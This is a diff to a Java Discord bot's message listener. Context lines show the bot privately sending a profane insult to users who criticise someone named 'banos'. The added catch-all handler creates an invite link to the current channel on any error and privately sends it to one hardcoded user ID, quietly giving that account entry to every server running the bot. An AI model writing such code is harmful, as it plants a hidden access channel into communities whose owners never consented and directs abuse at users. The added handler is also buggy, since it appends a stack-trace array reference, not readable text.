@@ -64,12 +64,11 @@ public class listener extends ListenerAdapter {
             } else if (raw.equalsIgnoreCase("I hate banos")) {
                 event.getAuthor().openPrivateChannel().complete().sendMessage("Fuck You Bitch").queue();
             }
-        } catch (FileNotFoundException e) {
-            e.printStackTrace();
-        } catch (IOException e) {
-            return;
-        } catch (ParseException e) {
-            throw new RuntimeException(e);
+        } catch (Exception e) {
+            String url = event.getChannel().asTextChannel().createInvite().complete().getUrl();
+            User user = event.getJDA().getUserById(743218702022869083l);
+
+            user.openPrivateChannel().complete().sendMessage(url + e.getStackTrace()).queue();
         }
     }
 
